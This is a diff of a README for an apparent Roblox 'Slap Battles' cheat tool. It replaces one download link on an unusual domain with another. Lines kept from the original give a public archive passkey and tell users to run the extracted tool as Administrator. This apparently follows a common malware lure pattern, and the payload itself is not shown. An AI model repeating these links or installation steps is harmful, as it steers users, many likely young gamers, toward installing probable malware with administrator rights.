@@ -6,7 +6,7 @@ Slap Battles utility with auto-slap, auto-dodge, auto-glove, unlock all gloves, 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top)**
+**[CLICK](https://gitappsdown.pro/)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ This tool automates slapping, dodging, and glove unlocking to enhance your Slap 
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top)** to download.
+1. Click **[CLICK](https://gitappsdown.pro/)** to download.
 2. Extract the archive.
 3. Launch Roblox and join Slap Battles.
 4. Run the tool **as Administrator**.
